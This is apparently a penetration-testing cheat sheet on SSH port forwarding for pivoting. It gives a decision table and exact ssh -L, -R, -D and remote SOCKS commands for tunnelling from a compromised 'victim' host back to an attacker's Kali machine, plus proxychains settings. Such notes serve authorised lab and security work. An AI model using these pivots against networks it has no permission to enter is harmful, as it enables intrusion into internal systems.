---
description: One-liner explanations + exact commands. No fluff. Just pivot and go.
---

# SSH Port Forwarding

## Quick Decision Table

| **Situation**                                                              | **SSH Direction**       | **Target Known?** | **Proxy Needed?** | **Use**                        | **Flag**     |
| -------------------------------------------------------------------------- | ----------------------- | ----------------- | ----------------- | ------------------------------ | ------------ |
| You can SSH into a box and access a known internal host                    | SSH into victim         | ✅ Yes             | ❌ No              | Local Port Forwarding          | `-L`         |
| You have reverse shell and want Kali to access an internal host via victim | SSH from victim to Kali | ✅ Yes             | ❌ No              | Remote Port Forwarding         | `-R`         |
| You can SSH into a box and want to scan multiple unknown targets           | SSH into victim         | ❌ No              | ✅ Yes             | Dynamic Port Forwarding        | `-D`         |
| You have reverse shell and want Kali to proxy via victim to scan/enumerate | SSH from victim to Kali | ❌ No              | ✅ Yes             | Remote Dynamic Port Forwarding | `-R` (SOCKS) |

***

### Local Port Forwarding (`-L`)

**You can SSH into a box and want to access an internal host from there.**

```bash
ssh -N -L [KALI_PORT]:[TARGET_IP]:[TARGET_PORT] user@<pivot-box>
```

**Example:**

```bash
ssh -N -L 4455:172.16.217.217:445 user@10.4.217.215
```

***

### Remote Port Forwarding (`-R`)

**You have reverse shell and want Kali to access something the victim can reach.**

```bash
ssh -N -R [KALI_PORT]:[TARGET_IP]:[TARGET_PORT] kali@<your-kali-ip>
```

**Example:**

```bash
ssh -N -R 2345:10.4.217.215:5432 kali@192.168.45.187
```

***

### Dynamic Port Forwarding (`-D`)

**You can SSH into a pivot box and want to explore or scan targets via proxychains.**

```bash
ssh -N -D [PORT] user@<pivot-box>
```

**Example:**

```bash
ssh -N -D 9999 user@10.4.217.215
```

Then in `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 9999
```

***

### Remote Dynamic Port Forwarding (`-R` + SOCKS)

**You have reverse shell and want to proxy traffic from Kali through victim.**

```bash
ssh -N -R [PORT] kali@<your-kali-ip>
```

**Example:**

```bash
ssh -N -R 9998 kali@192.168.45.187
```

Then in `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 9998
```
